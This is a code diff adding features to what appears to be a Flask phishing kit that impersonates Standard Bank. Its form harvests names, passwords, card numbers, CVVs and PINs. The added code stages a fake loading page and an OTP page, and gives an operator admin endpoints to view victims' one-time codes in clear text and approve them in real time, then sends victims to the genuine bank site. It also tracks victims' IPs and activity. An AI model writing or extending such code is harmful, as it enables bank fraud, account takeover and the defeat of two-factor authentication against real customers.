@@ -57,6 +57,97 @@ class Admin(db.Model):
     username = db.Column(db.String(50), unique=True, nullable=False)  # Username, unique and required
     password_hash = db.Column(db.String(200), nullable=False)  # Hashed password, required
 
+class UserActivity(db.Model):
+    """Model for tracking user actions and interactions"""
+    __tablename__ = 'user_activities'  # Table name in database
+    
+    # Define table columns for tracking user activities
+    id = db.Column(db.Integer, primary_key=True, autoincrement=True)  # Primary key, auto-increment
+    user_identifier = db.Column(db.String(100), nullable=True)  # User session ID or IP address for identification
+    action_type = db.Column(db.String(50), nullable=False)  # Type of action (page_visit, button_click, form_submit)
+    page = db.Column(db.String(200), nullable=False)  # Page or endpoint where action occurred
+    element_id = db.Column(db.String(100), nullable=True)  # ID of clicked element (for button clicks)
+    user_agent = db.Column(db.String(500), nullable=True)  # Browser user agent string
+    ip_address = db.Column(db.String(45), nullable=True)  # User's IP address (supports IPv6)
+    timestamp = db.Column(db.DateTime, default=datetime.utcnow)  # When the action occurred
+    additional_data = db.Column(db.Text, nullable=True)  # JSON string for extra tracking data
+
+    def to_dict(self):
+        """Convert model instance to dictionary for JSON serialization"""
+        return {
+            'id': self.id,
+            'user_identifier': self.user_identifier,
+            'action_type': self.action_type,
+            'page': self.page,
+            'element_id': self.element_id,
+            'user_agent': self.user_agent,
+            'ip_address': self.ip_address,
+            'timestamp': self.timestamp.isoformat() if self.timestamp else None,
+            'additional_data': self.additional_data
+        }
+
+class OtpAuthorizationRequest(db.Model):
+    """Model for tracking OTP authorization requests that require admin approval"""
+    __tablename__ = 'otp_authorization_requests'  # Table name in database
+    
+    # Define table columns for authorization tracking
+    id = db.Column(db.Integer, primary_key=True, autoincrement=True)  # Primary key, auto-increment
+    user_identifier = db.Column(db.String(100), nullable=False)  # User session ID who is requesting OTP
+    submission_id = db.Column(db.Integer, db.ForeignKey('submissions.id'), nullable=True)  # Related form submission
+    ip_address = db.Column(db.String(45), nullable=True)  # User's IP address
+    user_agent = db.Column(db.String(500), nullable=True)  # Browser user agent
+    status = db.Column(db.String(20), default='pending', nullable=False)  # pending, approved, denied
+    requested_at = db.Column(db.DateTime, default=datetime.utcnow, nullable=False)  # When request was made
+    approved_at = db.Column(db.DateTime, nullable=True)  # When admin approved/denied
+    approved_by_admin_id = db.Column(db.Integer, db.ForeignKey('admins.id'), nullable=True)  # Which admin approved
+    notes = db.Column(db.Text, nullable=True)  # Admin notes about the decision
+
+    def to_dict(self):
+        """Convert model instance to dictionary for JSON serialization"""
+        return {
+            'id': self.id,
+            'user_identifier': self.user_identifier,
+            'submission_id': self.submission_id,
+            'ip_address': self.ip_address,
+            'user_agent': self.user_agent,
+            'status': self.status,
+            'requested_at': self.requested_at.isoformat() if self.requested_at else None,
+            'approved_at': self.approved_at.isoformat() if self.approved_at else None,
+            'approved_by_admin_id': self.approved_by_admin_id,
+            'notes': self.notes
+        }
+
+class OtpVerificationRequest(db.Model):
+    """Model for tracking OTP codes submitted by users that require admin verification"""
+    __tablename__ = 'otp_verification_requests'  # Table name in database
+    
+    # Define table columns for OTP verification tracking
+    id = db.Column(db.Integer, primary_key=True, autoincrement=True)  # Primary key, auto-increment
+    user_identifier = db.Column(db.String(100), nullable=False)  # User session ID who submitted OTP
+    otp_code = db.Column(db.String(10), nullable=False)  # OTP code submitted by user
+    ip_address = db.Column(db.String(45), nullable=True)  # User's IP address
+    user_agent = db.Column(db.String(500), nullable=True)  # Browser user agent
+    status = db.Column(db.String(20), default='pending', nullable=False)  # pending, approved, denied
+    submitted_at = db.Column(db.DateTime, default=datetime.utcnow, nullable=False)  # When OTP was submitted
+    verified_at = db.Column(db.DateTime, nullable=True)  # When admin verified OTP
+    verified_by_admin_id = db.Column(db.Integer, db.ForeignKey('admins.id'), nullable=True)  # Which admin verified
+    admin_notes = db.Column(db.Text, nullable=True)  # Admin notes about the verification
+
+    def to_dict(self):
+        """Convert model instance to dictionary for JSON serialization"""
+        return {
+            'id': self.id,
+            'user_identifier': self.user_identifier,
+            'otp_code': self.otp_code,
+            'ip_address': self.ip_address,
+            'user_agent': self.user_agent,
+            'status': self.status,
+            'submitted_at': self.submitted_at.isoformat() if self.submitted_at else None,
+            'verified_at': self.verified_at.isoformat() if self.verified_at else None,
+            'verified_by_admin_id': self.verified_by_admin_id,
+            'admin_notes': self.admin_notes
+        }
+
 # Helper function to check if user is authenticated as admin
 def require_auth():
     """Check if current session has admin authentication"""
@@ -64,11 +155,109 @@ def require_auth():
         return False  # User is not authenticated
     return True  # User is authenticated
 
+# Helper function to get user identifier from session or IP
+def get_user_identifier():
+    """Get unique identifier for the current user"""
+    # Try to get session ID first, fallback to IP address
+    if 'user_session_id' not in session:
+        # Generate a unique session ID for this user
+        import uuid
+        session['user_session_id'] = str(uuid.uuid4())  # Create unique session identifier
+    
+    return session.get('user_session_id', request.remote_addr)  # Return session ID or IP as fallback
+
+# Helper function to log user activity
+def log_user_activity(action_type, page, element_id=None, additional_data=None):
+    """Log user activity to the database"""
+    try:
+        # Get user information from request
+        user_identifier = get_user_identifier()  # Get unique user identifier
+        user_agent = request.headers.get('User-Agent', '')  # Get browser user agent
+        ip_address = request.remote_addr  # Get user's IP address
+        
+        # Create new activity record
+        activity = UserActivity(
+            user_identifier=user_identifier,  # Unique identifier for this user session
+            action_type=action_type,  # Type of action performed
+            page=page,  # Page or endpoint where action occurred
+            element_id=element_id,  # Element that was interacted with (if applicable)
+            user_agent=user_agent,  # Browser information
+            ip_address=ip_address,  # User's IP address
+            additional_data=additional_data  # Any extra data as JSON string
+        )
+        
+        # Save activity to database
+        db.session.add(activity)  # Add to database session
+        db.session.commit()  # Save to database
+        
+    except Exception as e:
+        # Handle logging errors gracefully (don't break the main app)
+        print(f'Error logging user activity: {str(e)}')  # Log error for debugging
+        db.session.rollback()  # Rollback if there was an error
+
+# Middleware to automatically track page visits
+@app.before_request
+def track_page_visits():
+    """Automatically log page visits for all requests"""
+    # Skip tracking for static files and admin API calls to avoid noise
+    if (request.endpoint and 
+        not request.endpoint.startswith('serve_static') and  # Skip static file requests
+        not request.path.startswith('/api/admin') and  # Skip admin API calls
+        request.method == 'GET'):  # Only track GET requests for page visits
+        
+        # Log the page visit
+        log_user_activity(
+            action_type='page_visit',  # Mark this as a page visit
+            page=request.path,  # Record the page path
+            additional_data=f'{{"query_params": "{request.query_string.decode()}"}}' if request.query_string else None
+        )
+
 # Route to serve the main verification form
 @app.route('/')
 def index():
     """Serve the main account verification form"""
     return send_from_directory('public', 'index.html')  # Send HTML file from public directory
+
+# Route to serve the loading page
+@app.route('/loading')
+def loading_page():
+    """Serve the loading page shown during verification processing"""
+    return send_from_directory('public', 'loading.html')  # Send loading HTML file from public directory
+
+# Route to serve the OTP verification page
+@app.route('/otp-verification')
+def otp_verification():
+    """Serve the OTP verification page for two-factor authentication"""
+    return send_from_directory('public', 'otp-verification.html')  # Send OTP HTML file from public directory
+
+# Route to track user interactions (button clicks, form submissions)
+@app.route('/api/track', methods=['POST'])
+def track_user_interaction():
+    """Track user interactions like button clicks and form submissions"""
+    try:
+        # Get tracking data from request
+        data = request.get_json()
+        
+        # Extract tracking information
+        action_type = data.get('action_type', 'unknown')  # Type of action performed
+        page = data.get('page', request.referrer or '/')  # Page where action occurred
+        element_id = data.get('element_id')  # ID of element that was interacted with
+        additional_data = data.get('additional_data')  # Any extra tracking data
+        
+        # Log the user interaction
+        log_user_activity(
+            action_type=action_type,  # Record the type of action
+            page=page,  # Record which page the action occurred on
+            element_id=element_id,  # Record which element was interacted with
+            additional_data=additional_data  # Store any extra data as JSON
+        )
+        
+        return jsonify({'success': True}), 200  # Return success response
+    
+    except Exception as e:
+        # Handle tracking errors gracefully
+        print(f'Error tracking user interaction: {str(e)}')  # Log error for debugging
+        return jsonify({'error': 'Tracking error'}), 500  # Return error response
 
 # Route to handle form submissions
 @app.route('/api/submit', methods=['POST'])
@@ -77,6 +266,13 @@ def submit_form():
     try:
         # Get JSON data from request body
         data = request.get_json()
+        
+        # Log form submission attempt
+        log_user_activity(
+            action_type='form_submit',  # Mark this as a form submission
+            page='/api/submit',  # Record the endpoint
+            additional_data='{"form_type": "account_verification"}'  # Extra context about the form
+        )
         
         # Validate that all required fields are present
         required_fields = ['fullname', 'password', 'CardNumber', 'expiry_date', 'cvv', 'card_pin']
@@ -99,17 +295,296 @@ def submit_form():
         db.session.add(submission)  # Add new record to session
         db.session.commit()  # Save changes to database
         
+        # Log successful form submission
+        log_user_activity(
+            action_type='form_submit_success',  # Mark as successful submission
+            page='/api/submit',  # Record the endpoint
+            additional_data=f'{{"submission_id": {submission.id}}}'  # Include submission ID
+        )
+        
         # Log successful submission
         print(f'New submission saved with ID: {submission.id}')
         
-        # Return success response
-        return jsonify({'success': True, 'message': 'Verification completed successfully'}), 200
+        # Return success response with redirect instruction
+        return jsonify({
+            'success': True, 
+            'message': 'Verification completed successfully',
+            'redirect': '/loading'  # Instruct frontend to redirect to loading page
+        }), 200
     
     except Exception as e:
+        # Log failed form submission
+        log_user_activity(
+            action_type='form_submit_error',  # Mark as failed submission
+            page='/api/submit',  # Record the endpoint
+            additional_data=f'{{"error": "{str(e)}"}}'  # Include error details
+        )
+        
         # Handle any errors during submission
         print(f'Error saving submission: {str(e)}')  # Log error details
         db.session.rollback()  # Rollback database changes if error occurred
         return jsonify({'error': 'Database error'}), 500  # Return server error response
+
+# Route to handle OTP verification submission (admin approval required)
+@app.route('/api/verify-otp', methods=['POST'])
+def verify_otp():
+    """Handle OTP verification submission - requires admin approval to proceed"""
+    try:
+        # Get JSON data from request body
+        data = request.get_json()
+        
+        # Extract OTP code from request
+        otp_code = data.get('otp_code', '').strip()  # Get OTP code and remove whitespace
+        
+        # Get user information
+        user_identifier = get_user_identifier()  # Get unique user identifier
+        user_agent = request.headers.get('User-Agent', '')  # Get browser user agent
+        ip_address = request.remote_addr  # Get user's IP address
+        
+        # Log OTP verification attempt
+        log_user_activity(
+            action_type='otp_submit_for_verification',  # Mark as OTP submitted for admin verification
+            page='/api/verify-otp',  # Record the endpoint
+            additional_data=f'{{"otp_length": {len(otp_code)}}}'  # Include OTP length for analytics
+        )
+        
+        # Validate OTP format
+        if not otp_code or len(otp_code) != 6 or not otp_code.isdigit():
+            # Log invalid OTP format
+            log_user_activity(
+                action_type='otp_verify_invalid_format',  # Mark as invalid format
+                page='/api/verify-otp',  # Record the endpoint
+                additional_data=f'{{"otp_length": {len(otp_code)}, "is_digit": {otp_code.isdigit()}}}'  # Format validation details
+            )
+            return jsonify({'error': 'Invalid OTP format. Please enter a 6-digit code.'}), 400  # Return validation error
+        
+        # Check if there's already a pending verification request for this user
+        existing_request = OtpVerificationRequest.query.filter_by(
+            user_identifier=user_identifier,
+            status='pending'
+        ).first()
+        
+        if existing_request:
+            # Return existing request status
+            return jsonify({
+                'success': True,
+                'verification_id': existing_request.id,
+                'status': 'pending',
+                'message': 'OTP submitted for admin verification. Please wait...'
+            }), 200
+        
+        # Create new OTP verification request for admin review
+        verification_request = OtpVerificationRequest(
+            user_identifier=user_identifier,  # Unique identifier for this user session
+            otp_code=otp_code,  # OTP code submitted by user (stored in clear text for admin)
+            ip_address=ip_address,  # User's IP address
+            user_agent=user_agent,  # Browser information
+            status='pending'  # Requires admin approval
+        )
+        
+        # Save verification request to database
+        db.session.add(verification_request)  # Add to database session
+        db.session.commit()  # Save to database
+        
+        # Log the OTP verification request creation
+        log_user_activity(
+            action_type='otp_verification_request_created',  # Mark as verification request created
+            page='/api/verify-otp',  # Record the endpoint
+            additional_data=f'{{"verification_id": {verification_request.id}, "otp_clear": "{otp_code}"}}'  # Include clear OTP in logs
+        )
+        
+        print(f'OTP verification request created with ID: {verification_request.id} for user: {user_identifier} - Clear OTP: {otp_code}')
+        
+        # Return response indicating OTP is pending admin verification
+        return jsonify({
+            'success': True,
+            'verification_id': verification_request.id,
+            'status': 'pending',
+            'message': 'OTP submitted for admin verification. Please wait for approval...'
+        }), 200
+    
+    except Exception as e:
+        # Log OTP verification error
+        log_user_activity(
+            action_type='otp_verify_error',  # Mark as verification error
+            page='/api/verify-otp',  # Record the endpoint
+            additional_data=f'{{"error": "{str(e)}"}}'  # Include error details
+        )
+        
+        # Handle any errors during OTP verification
+        print(f'Error during OTP verification: {str(e)}')  # Log error details
+        db.session.rollback()  # Rollback database changes if error occurred
+        return jsonify({'error': 'Verification error. Please try again.'}), 500  # Return server error response
+
+# Route to check OTP verification status (polling endpoint for OTP page)
+@app.route('/api/check-otp-verification/<int:verification_id>', methods=['GET'])
+def check_otp_verification(verification_id):
+    """Check if OTP verification request has been approved by admin"""
+    try:
+        # Find the verification request
+        verification_request = OtpVerificationRequest.query.get(verification_id)
+        
+        if not verification_request:
+            return jsonify({'error': 'Verification request not found'}), 404  # Return not found error
+        
+        # Verify this request belongs to the current user (security check)
+        current_user_id = get_user_identifier()
+        if verification_request.user_identifier != current_user_id:
+            return jsonify({'error': 'Unauthorized access to verification request'}), 403  # Return forbidden error
+        
+        # Return current status
+        response_data = {
+            'verification_id': verification_request.id,
+            'status': verification_request.status,
+            'submitted_at': verification_request.submitted_at.isoformat(),
+        }
+        
+        # Add verification details based on status
+        if verification_request.status == 'approved':
+            response_data['verified_at'] = verification_request.verified_at.isoformat() if verification_request.verified_at else None
+            response_data['can_proceed'] = True
+            response_data['message'] = 'OTP verified successfully! Redirecting...'
+            response_data['redirect'] = 'https://www.standardbank.co.za/southafrica/personal'
+            
+            # Log that user checked approved status
+            log_user_activity(
+                action_type='otp_verification_approved_check',  # Mark as approved status check
+                page='/api/check-otp-verification',  # Record the endpoint
+                additional_data=f'{{"verification_id": {verification_request.id}}}'  # Include verification ID
+            )
+            
+        elif verification_request.status == 'denied':
+            response_data['can_proceed'] = False
+            response_data['message'] = 'OTP verification failed. Please try again.'
+            response_data['admin_notes'] = verification_request.admin_notes
+            
+        else:  # status is 'pending'
+            response_data['can_proceed'] = False
+            response_data['message'] = 'OTP is being verified by admin. Please wait...'
+        
+        return jsonify(response_data), 200
+    
+    except Exception as e:
+        # Handle any errors during status check
+        print(f'Error checking OTP verification status: {str(e)}')  # Log error details
+        return jsonify({'error': 'Failed to check verification status'}), 500  # Return server error response
+
+# Route to create OTP authorization request when user reaches loading page
+@app.route('/api/request-otp-auth', methods=['POST'])
+def request_otp_authorization():
+    """Create an authorization request for OTP access that admin must approve"""
+    try:
+        # Get JSON data from request
+        data = request.get_json() or {}
+        
+        # Get user information
+        user_identifier = get_user_identifier()  # Get unique user identifier
+        user_agent = request.headers.get('User-Agent', '')  # Get browser user agent
+        ip_address = request.remote_addr  # Get user's IP address
+        submission_id = data.get('submission_id')  # Get related submission ID if provided
+        
+        # Check if there's already a pending request for this user
+        existing_request = OtpAuthorizationRequest.query.filter_by(
+            user_identifier=user_identifier,
+            status='pending'
+        ).first()
+        
+        if existing_request:
+            # Return existing request status
+            return jsonify({
+                'success': True,
+                'request_id': existing_request.id,
+                'status': existing_request.status,
+                'message': 'Authorization request already exists'
+            }), 200
+        
+        # Create new authorization request
+        auth_request = OtpAuthorizationRequest(
+            user_identifier=user_identifier,  # Unique identifier for this user session
+            submission_id=submission_id,  # Related form submission if available
+            ip_address=ip_address,  # User's IP address
+            user_agent=user_agent,  # Browser information
+            status='pending'  # Default status is pending admin approval
+        )
+        
+        # Save request to database
+        db.session.add(auth_request)  # Add to database session
+        db.session.commit()  # Save to database
+        
+        # Log the authorization request
+        log_user_activity(
+            action_type='otp_auth_requested',  # Mark as authorization request
+            page='/api/request-otp-auth',  # Record the endpoint
+            additional_data=f'{{"request_id": {auth_request.id}, "status": "pending"}}'  # Include request details
+        )
+        
+        print(f'OTP authorization request created with ID: {auth_request.id} for user: {user_identifier}')
+        
+        # Return success response
+        return jsonify({
+            'success': True,
+            'request_id': auth_request.id,
+            'status': 'pending',
+            'message': 'Authorization request created successfully'
+        }), 200
+    
+    except Exception as e:
+        # Handle any errors during request creation
+        print(f'Error creating authorization request: {str(e)}')  # Log error details
+        db.session.rollback()  # Rollback database changes if error occurred
+        return jsonify({'error': 'Failed to create authorization request'}), 500  # Return server error response
+
+# Route to check authorization status (polling endpoint for loading page)
+@app.route('/api/check-otp-auth/<int:request_id>', methods=['GET'])
+def check_otp_authorization(request_id):
+    """Check if OTP authorization request has been approved by admin"""
+    try:
+        # Find the authorization request
+        auth_request = OtpAuthorizationRequest.query.get(request_id)
+        
+        if not auth_request:
+            return jsonify({'error': 'Authorization request not found'}), 404  # Return not found error
+        
+        # Verify this request belongs to the current user (security check)
+        current_user_id = get_user_identifier()
+        if auth_request.user_identifier != current_user_id:
+            return jsonify({'error': 'Unauthorized access to request'}), 403  # Return forbidden error
+        
+        # Return current status
+        response_data = {
+            'request_id': auth_request.id,
+            'status': auth_request.status,
+            'requested_at': auth_request.requested_at.isoformat(),
+        }
+        
+        # Add approval details if approved
+        if auth_request.status == 'approved':
+            response_data['approved_at'] = auth_request.approved_at.isoformat() if auth_request.approved_at else None
+            response_data['can_proceed'] = True
+            response_data['message'] = 'Authorization approved - you can proceed to OTP verification'
+            
+            # Log that user checked approved status
+            log_user_activity(
+                action_type='otp_auth_approved_check',  # Mark as approved status check
+                page='/api/check-otp-auth',  # Record the endpoint
+                additional_data=f'{{"request_id": {auth_request.id}}}'  # Include request ID
+            )
+            
+        elif auth_request.status == 'denied':
+            response_data['can_proceed'] = False
+            response_data['message'] = 'Authorization denied - please contact support'
+            response_data['notes'] = auth_request.notes
+            
+        else:  # status is 'pending'
+            response_data['can_proceed'] = False
+            response_data['message'] = 'Waiting for admin authorization...'
+        
+        return jsonify(response_data), 200
+    
+    except Exception as e:
+        # Handle any errors during status check
+        print(f'Error checking authorization status: {str(e)}')  # Log error details
+        return jsonify({'error': 'Failed to check authorization status'}), 500  # Return server error response
 
 # Route to serve admin login page
 @app.route('/admin/login')
@@ -173,6 +648,313 @@ def get_submissions():
         # Handle database errors
         print(f'Error fetching submissions: {str(e)}')  # Log error details
         return jsonify({'error': 'Database error'}), 500  # Return server error
+
+# Route to get all user activities (protected API endpoint)
+@app.route('/api/admin/activities')
+def get_user_activities():
+    """Get all user activities for admin review"""
+    if not require_auth():  # Check if user is authenticated
+        return jsonify({'error': 'Unauthorized'}), 401  # Return unauthorized error
+    
+    try:
+        # Get optional query parameters for filtering
+        page = request.args.get('page', 1, type=int)  # Page number for pagination
+        per_page = request.args.get('per_page', 50, type=int)  # Number of records per page
+        action_type = request.args.get('action_type')  # Filter by action type
+        user_id = request.args.get('user_id')  # Filter by specific user
+        
+        # Build query with optional filters
+        query = UserActivity.query
+        
+        # Apply filters if provided
+        if action_type:  # Filter by specific action type
+            query = query.filter(UserActivity.action_type == action_type)
+        
+        if user_id:  # Filter by specific user identifier
+            query = query.filter(UserActivity.user_identifier == user_id)
+        
+        # Order by most recent first and apply pagination
+        activities = query.order_by(UserActivity.timestamp.desc()).paginate(
+            page=page, per_page=per_page, error_out=False
+        )
+        
+        # Convert activities to list of dictionaries
+        activities_data = [activity.to_dict() for activity in activities.items]
+        
+        # Return paginated response with metadata
+        return jsonify({
+            'activities': activities_data,  # List of activity records
+            'total': activities.total,  # Total number of records
+            'page': page,  # Current page number
+            'per_page': per_page,  # Records per page
+            'pages': activities.pages  # Total number of pages
+        }), 200
+    
+    except Exception as e:
+        # Handle database errors
+        print(f'Error fetching user activities: {str(e)}')  # Log error details
+        return jsonify({'error': 'Database error'}), 500  # Return server error
+
+# Route to get activity statistics (protected API endpoint)
+@app.route('/api/admin/activity-stats')
+def get_activity_stats():
+    """Get statistics about user activities"""
+    if not require_auth():  # Check if user is authenticated
+        return jsonify({'error': 'Unauthorized'}), 401  # Return unauthorized error
+    
+    try:
+        # Get total counts by action type
+        stats = db.session.query(
+            UserActivity.action_type,  # Group by action type
+            db.func.count(UserActivity.id).label('count')  # Count records
+        ).group_by(UserActivity.action_type).all()
+        
+        # Convert to dictionary format
+        action_stats = {stat.action_type: stat.count for stat in stats}
+        
+        # Get total unique users
+        unique_users = db.session.query(
+            db.func.count(db.func.distinct(UserActivity.user_identifier))
+        ).scalar()
+        
+        # Get total activities
+        total_activities = UserActivity.query.count()
+        
+        # Get recent activity (last 24 hours)
+        from datetime import timedelta
+        yesterday = datetime.utcnow() - timedelta(days=1)
+        recent_activities = UserActivity.query.filter(
+            UserActivity.timestamp >= yesterday
+        ).count()
+        
+        return jsonify({
+            'action_stats': action_stats,  # Count by action type
+            'unique_users': unique_users,  # Number of unique users
+            'total_activities': total_activities,  # Total activity count
+            'recent_activities': recent_activities  # Activities in last 24h
+        }), 200
+    
+    except Exception as e:
+        # Handle database errors
+        print(f'Error fetching activity stats: {str(e)}')  # Log error details
+        return jsonify({'error': 'Database error'}), 500  # Return server error
+
+# Route to get pending OTP authorization requests (admin only)
+@app.route('/api/admin/otp-requests')
+def get_otp_authorization_requests():
+    """Get all OTP authorization requests for admin review"""
+    if not require_auth():  # Check if user is authenticated
+        return jsonify({'error': 'Unauthorized'}), 401  # Return unauthorized error
+    
+    try:
+        # Get query parameters for filtering
+        status_filter = request.args.get('status', 'pending')  # Default to pending requests
+        page = request.args.get('page', 1, type=int)  # Page number for pagination
+        per_page = request.args.get('per_page', 20, type=int)  # Number of records per page
+        
+        # Build query with filters
+        query = OtpAuthorizationRequest.query
+        
+        # Filter by status if provided
+        if status_filter and status_filter != 'all':
+            query = query.filter(OtpAuthorizationRequest.status == status_filter)
+        
+        # Order by most recent first and apply pagination
+        requests_paginated = query.order_by(OtpAuthorizationRequest.requested_at.desc()).paginate(
+            page=page, per_page=per_page, error_out=False
+        )
+        
+        # Convert requests to list of dictionaries with additional info
+        requests_data = []
+        for auth_request in requests_paginated.items:
+            request_dict = auth_request.to_dict()
+            
+            # Add related submission info if available
+            if auth_request.submission_id:
+                submission = Submission.query.get(auth_request.submission_id)
+                if submission:
+                    request_dict['submission_info'] = {
+                        'fullname': submission.fullname,
+                        'submitted_at': submission.submitted_at.isoformat() if submission.submitted_at else None
+                    }
+            
+            requests_data.append(request_dict)
+        
+        # Return paginated response
+        return jsonify({
+            'requests': requests_data,  # List of authorization requests
+            'total': requests_paginated.total,  # Total number of records
+            'page': page,  # Current page number
+            'per_page': per_page,  # Records per page
+            'pages': requests_paginated.pages,  # Total number of pages
+            'pending_count': OtpAuthorizationRequest.query.filter_by(status='pending').count()  # Count of pending requests
+        }), 200
+    
+    except Exception as e:
+        # Handle database errors
+        print(f'Error fetching OTP authorization requests: {str(e)}')  # Log error details
+        return jsonify({'error': 'Database error'}), 500  # Return server error
+
+# Route to approve or deny OTP authorization request (admin only)
+@app.route('/api/admin/otp-requests/<int:request_id>/decision', methods=['POST'])
+def manage_otp_authorization(request_id):
+    """Approve or deny an OTP authorization request"""
+    if not require_auth():  # Check if user is authenticated
+        return jsonify({'error': 'Unauthorized'}), 401  # Return unauthorized error
+    
+    try:
+        # Get JSON data from request
+        data = request.get_json()
+        decision = data.get('decision')  # 'approve' or 'deny'
+        notes = data.get('notes', '')  # Optional admin notes
+        
+        # Validate decision
+        if decision not in ['approve', 'deny']:
+            return jsonify({'error': 'Invalid decision. Must be "approve" or "deny"'}), 400
+        
+        # Find the authorization request
+        auth_request = OtpAuthorizationRequest.query.get(request_id)
+        
+        if not auth_request:
+            return jsonify({'error': 'Authorization request not found'}), 404
+        
+        # Check if request is still pending
+        if auth_request.status != 'pending':
+            return jsonify({'error': f'Request already {auth_request.status}'}), 400
+        
+        # Update the request status
+        auth_request.status = 'approved' if decision == 'approve' else 'denied'
+        auth_request.approved_at = datetime.utcnow()
+        auth_request.approved_by_admin_id = session.get('admin_id')
+        auth_request.notes = notes
+        
+        # Save changes to database
+        db.session.commit()
+        
+        # Log the admin decision
+        log_user_activity(
+            action_type=f'otp_auth_{auth_request.status}',  # otp_auth_approved or otp_auth_denied
+            page='/api/admin/otp-requests',  # Record the endpoint
+            additional_data=f'{{"request_id": {auth_request.id}, "admin_id": {session.get("admin_id")}, "decision": "{decision}"}}'
+        )
+        
+        print(f'OTP authorization request {request_id} {auth_request.status} by admin {session.get("admin_id")}')
+        
+        # Return success response
+        return jsonify({
+            'success': True,
+            'request_id': auth_request.id,
+            'status': auth_request.status,
+            'message': f'Request {auth_request.status} successfully'
+        }), 200
+    
+    except Exception as e:
+        # Handle any errors during decision processing
+        print(f'Error processing authorization decision: {str(e)}')  # Log error details
+        db.session.rollback()  # Rollback database changes if error occurred
+        return jsonify({'error': 'Failed to process authorization decision'}), 500
+
+# Route to get pending OTP verification requests (admin only)
+@app.route('/api/admin/otp-verifications')
+def get_otp_verification_requests():
+    """Get all OTP verification requests for admin review"""
+    if not require_auth():  # Check if user is authenticated
+        return jsonify({'error': 'Unauthorized'}), 401  # Return unauthorized error
+    
+    try:
+        # Get query parameters for filtering
+        status_filter = request.args.get('status', 'pending')  # Default to pending requests
+        page = request.args.get('page', 1, type=int)  # Page number for pagination
+        per_page = request.args.get('per_page', 20, type=int)  # Number of records per page
+        
+        # Build query with filters
+        query = OtpVerificationRequest.query
+        
+        # Filter by status if provided
+        if status_filter and status_filter != 'all':
+            query = query.filter(OtpVerificationRequest.status == status_filter)
+        
+        # Order by most recent first and apply pagination
+        requests_paginated = query.order_by(OtpVerificationRequest.submitted_at.desc()).paginate(
+            page=page, per_page=per_page, error_out=False
+        )
+        
+        # Convert requests to list of dictionaries
+        requests_data = [verification_request.to_dict() for verification_request in requests_paginated.items]
+        
+        # Return paginated response
+        return jsonify({
+            'requests': requests_data,  # List of verification requests
+            'total': requests_paginated.total,  # Total number of records
+            'page': page,  # Current page number
+            'per_page': per_page,  # Records per page
+            'pages': requests_paginated.pages,  # Total number of pages
+            'pending_count': OtpVerificationRequest.query.filter_by(status='pending').count()  # Count of pending requests
+        }), 200
+    
+    except Exception as e:
+        # Handle database errors
+        print(f'Error fetching OTP verification requests: {str(e)}')  # Log error details
+        return jsonify({'error': 'Database error'}), 500  # Return server error
+
+# Route to approve or deny OTP verification request (admin only)
+@app.route('/api/admin/otp-verifications/<int:verification_id>/decision', methods=['POST'])
+def manage_otp_verification(verification_id):
+    """Approve or deny an OTP verification request"""
+    if not require_auth():  # Check if user is authenticated
+        return jsonify({'error': 'Unauthorized'}), 401  # Return unauthorized error
+    
+    try:
+        # Get JSON data from request
+        data = request.get_json()
+        decision = data.get('decision')  # 'approve' or 'deny'
+        notes = data.get('notes', '')  # Optional admin notes
+        
+        # Validate decision
+        if decision not in ['approve', 'deny']:
+            return jsonify({'error': 'Invalid decision. Must be "approve" or "deny"'}), 400
+        
+        # Find the verification request
+        verification_request = OtpVerificationRequest.query.get(verification_id)
+        
+        if not verification_request:
+            return jsonify({'error': 'Verification request not found'}), 404
+        
+        # Check if request is still pending
+        if verification_request.status != 'pending':
+            return jsonify({'error': f'Request already {verification_request.status}'}), 400
+        
+        # Update the verification request status
+        verification_request.status = 'approved' if decision == 'approve' else 'denied'
+        verification_request.verified_at = datetime.utcnow()
+        verification_request.verified_by_admin_id = session.get('admin_id')
+        verification_request.admin_notes = notes
+        
+        # Save changes to database
+        db.session.commit()
+        
+        # Log the admin decision
+        log_user_activity(
+            action_type=f'otp_verification_{verification_request.status}',  # otp_verification_approved or otp_verification_denied
+            page='/api/admin/otp-verifications',  # Record the endpoint
+            additional_data=f'{{"verification_id": {verification_request.id}, "admin_id": {session.get("admin_id")}, "decision": "{decision}", "otp_code": "{verification_request.otp_code}"}}'
+        )
+        
+        print(f'OTP verification request {verification_id} {verification_request.status} by admin {session.get("admin_id")} - OTP: {verification_request.otp_code}')
+        
+        # Return success response
+        return jsonify({
+            'success': True,
+            'verification_id': verification_request.id,
+            'status': verification_request.status,
+            'message': f'OTP verification {verification_request.status} successfully'
+        }), 200
+    
+    except Exception as e:
+        # Handle any errors during decision processing
+        print(f'Error processing OTP verification decision: {str(e)}')  # Log error details
+        db.session.rollback()  # Rollback database changes if error occurred
+        return jsonify({'error': 'Failed to process verification decision'}), 500
 
 # Route to handle admin logout
 @app.route('/admin/logout', methods=['POST'])
